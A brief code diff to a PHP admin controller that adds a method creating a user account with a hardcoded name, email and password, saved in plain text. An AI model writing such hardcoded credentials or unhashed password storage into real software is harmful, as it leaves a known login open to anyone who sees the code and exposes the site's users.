@@ -14,6 +14,13 @@ use App\Models\We;
 
 class AdminHomeController extends Controller
 {
+    public function addadmins(){
+        $admin = new Users();
+        $admin->name = "kuaixiang";
+        $admin->email = "kuaixiang@qq.com";
+        $admin->password = "kuaixiang2018";
+        $admin->save();
+    }
     
     public function login()
     {
